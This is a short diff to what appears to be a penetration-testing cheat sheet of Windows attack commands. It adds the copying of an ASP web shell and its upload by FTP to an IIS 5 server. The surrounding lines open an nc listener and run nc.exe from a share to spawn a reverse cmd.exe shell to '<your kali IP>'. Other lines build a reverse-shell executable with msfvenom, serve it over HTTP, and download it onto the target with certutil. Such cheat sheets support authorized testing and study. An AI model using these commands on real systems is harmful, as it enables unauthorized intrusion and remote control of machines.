@@ -432,6 +432,10 @@ nc -nlvp 80
 cmd.exe /c //<your kali IP>/Share/nc.exe -e cmd.exe <your kali IP> 80
 ````
 ````
+cp /usr/share/webshells/asp/cmd-asp-5.1.asp . #IIS 5
+ftp> put cmd-asp-5.1.asp
+````
+````
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
 python3 -m http.server 80
 certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
